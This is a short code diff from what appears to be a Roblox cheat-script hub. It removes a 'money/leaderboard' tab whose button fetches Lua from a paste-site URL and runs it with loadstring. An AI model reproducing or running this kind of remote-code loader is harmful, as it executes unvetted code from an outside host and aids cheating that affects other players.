@@ -322,22 +322,6 @@ EspSection:AddButton({
     end
 })
 
-local JogadorTab = Window:MakeTab({
-  Name = "MONEY - LEABOARD",
-  Icon = "",
-  PremiumOnly = false
-})
-
-local Section = JogadorTab:AddSection({
-  Name = "Hub"
-})
-
-JogadorTab:AddButton({
-  Name = "Altera leaboard",
-  Callback = function()
-      loadstring(game:HttpGet(('https://pst.klgrth.io/paste/9dfhy/raw'),true))()
-    end
-})
 
 local Section = moneyTab:AddSection({
   Name = "Money"
